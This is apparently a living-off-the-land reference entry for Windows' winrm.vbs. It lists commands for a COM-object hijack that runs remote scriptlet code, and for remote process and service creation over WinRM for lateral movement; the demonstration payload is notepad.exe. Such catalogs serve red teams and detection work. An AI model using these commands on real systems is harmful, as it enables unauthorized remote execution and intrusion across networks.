## Winrm.vbs
* Functions: Execute
```

reg.exe import c:\path\to\Slmgr.reg & winrm quickconfig
Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code.

winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985
Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol.

winrm invoke Create wmicimv2/Win32_Service @{Name="Evil";DisplayName="Evil";PathName="cmd.exe /k c:\windows\system32\notepad.exe"} -r:http://acmedc:5985   \nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985
Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol.
```
   
* Resources:   
  * https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
  * https://www.youtube.com/watch?v=3gz1QmiMhss
  * https://github.com/enigma0x3/windows-operating-system-archaeology
  * https://redcanary.com/blog/lateral-movement-winrm-wmi/
  * https://twitter.com/bohops/status/994405551751815170
   
* Full path:   
  * C:\windows\system32\winrm.vbs
  * C:\windows\SysWOW64\winrm.vbs
   
* Notes: Thanks to Matt Nelson - @enigma0x3 (Hijack), Casey Smith - @subtee (Hijack), Red Canary Company cc Tony Lambert - @redcanaryco (Win32_Process LM), Jimmy - @bohops (Win32_Service LM)  
   
